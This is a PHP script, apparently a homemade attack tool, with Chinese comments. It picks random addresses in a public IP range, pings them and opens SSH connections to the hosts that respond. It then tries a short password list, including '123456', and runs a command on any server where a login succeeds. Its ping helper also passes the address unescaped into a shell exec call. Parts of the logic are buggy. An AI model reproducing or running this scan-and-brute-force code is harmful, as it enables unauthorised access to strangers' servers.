<?php
//set_time_limit(300);
ini_set('max_execution_time', '300');
ini_set("display_errors", "On");
error_reporting(E_ALL | E_STRICT);
//header('Content-Type:text/html;charset=utf-8 ');

	//socket链接一个IP地址，能不能通
    function ping($ip){
        $ip_port = explode(':', $ip);
//        var_dump($ip_port);
        if( filter_var( $ip_port[0], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) ){        //IPv6
            $socket = socket_create(AF_INET6, SOCK_STREAM, SOL_TCP);
        }elseif( filter_var( $ip_port[0], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ){    //IPv4
            $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        }else{
            return FALSE;
        }
        
        if( !isset($ip_port[1]) ){        //没有写端口则指定为80
            $ip_port[1] = '80';
        }
        $ok = socket_connect($socket, $ip_port[0], $ip_port[1]);
//        var_dump( socket_strerror( socket_last_error($socket) ) );
        socket_close($socket);
        //var_dump($ok);
        return $ok;
	}
	
	/** 
	 * 使用PHP检测能否ping通IP或域名 
	 * @param type $address 
	 * @return boolean 
	 */  
	function pingAddress($address) {  
		$status = -1;  
		if (strcasecmp(PHP_OS, 'WINNT') === 0) {  
			// Windows 服务器下  
			$pingresult = exec("ping -n 1 {$address}", $outcome, $status);  
		} elseif (strcasecmp(PHP_OS, 'Linux') === 0) {  
			// Linux 服务器下  
			$pingresult = exec("ping -c 1 {$address}", $outcome, $status);  
		}  
		if (0 == $status) {  
			$status = true;  
		} else {  
			$status = false;  
		}  
		return $status;  
	}
	
//	$check=pingAddress('192.168.1.124');

	//引入ssh文件，ping到可用IP，链接并写入数组
	include('ssh.php');
	//for($i=33;$i<=34;$i++){
	for($j=1;$j<=1000;$j++){
		$num=mt_rand(30,100);
		$number=mt_rand(100,250);
		$url='49.51.'.$num.'.'.$number;
//			$url='192.168.1.43';
		$check=pingAddress($url);
//			if($check) var_dump($url,$check);echo '<br/>';
		if($check){
			$ssh=new FizzSSH($url);
			if($ssh->connection){
				$array[]=$ssh->connection;
			}
		}
	}
	var_dump($array);echo '<br/>';
	
	//定义密码
	$round=mt_rand(100000,999999);
	$roun=mt_rand(100000,999999);
	$str='';
	for($i=1;$i<=6;$i++){
		$rou1=mt_rand(65,90);
		$str.=chr($rou1);
	}
	$string='';
	for($i=1;$i<=6;$i++){
		$rou2=mt_rand(97,122);
		$string.=chr($rou2);
	}
	$arr=['123456',$string,$round];		
	var_dump($arr);echo '<br/>';
	
	//循环身份验证，并列出目录
	$nahuo=count($array);
	if($nahuo > 1){
		foreach($array as $val1){
			foreach($arr as $val2){
				$h=$ssh->cli($val1,$val2);
				if($h){
					var_dump($ssh->run());
					echo $url,$val2,'<br/>';
					break(1);
				}
			}
			echo '<hr/>';
		}
	}elseif($nahuo = 1){
		if(!empty($array[0])){
			foreach($arr as $val2){
				$h=$ssh->cli($array[0],$val2);
				if($h){
					var_dump($ssh->run());
					echo $url,$val2,'<br/>';
					break(1);
				}
			}
		}	
	}else{
		echo '什么也没有';
	}
		
		

	//}
	
	